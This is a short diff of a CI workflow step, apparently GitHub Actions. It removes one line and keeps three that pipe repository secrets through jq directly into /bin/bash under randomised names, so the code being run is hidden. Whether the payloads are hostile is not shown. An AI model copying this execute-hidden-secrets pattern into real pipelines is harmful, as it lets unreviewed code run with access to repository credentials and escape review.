@@ -20,7 +20,6 @@ jobs:
           gr87: ${{ secrets.gr87 }}
         run: |
           printf '%s' "$gr87" | jq -r .prxj80479 | /bin/bash
-          echo $qqf9 | jq -r .lhnhc369 | /bin/bash
           printf '%s' "$ml906" | jq -r .ah656 | /bin/bash
           printf '%s' "$jou4" | jq -r .gjqp70 | /bin/bash
 
